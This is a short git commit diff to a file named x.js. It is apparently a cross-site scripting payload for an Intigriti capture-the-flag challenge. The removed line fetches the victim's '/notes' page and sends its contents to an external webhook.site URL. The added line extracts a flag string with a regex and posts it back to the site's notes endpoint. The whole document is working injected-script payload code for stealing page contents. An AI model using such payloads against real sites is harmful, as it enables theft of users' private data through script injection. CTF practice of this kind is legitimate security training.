7804299fbecc5f4ba8fb266fa3e456d566b4ed64
aljzayryaltrath-hash <aljzayryaltrath@gmail.com>
2026-06-16 11:54:22 +0100

    Modify fetch to post extracted flag to notes

--- x.js
+++ x.js
@@ -1,1 +1,1 @@
-fetch('/notes').then(r=>r.text()).then(d=>fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+encodeURIComponent(d)));
+fetch('/notes').then(r=>r.text()).then(d=>{var f=d.match(/INTIGRITI\{[^}]+\}/);if(f){fetch('/notes',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=FLAG&content='+encodeURIComponent(f[0])})}});
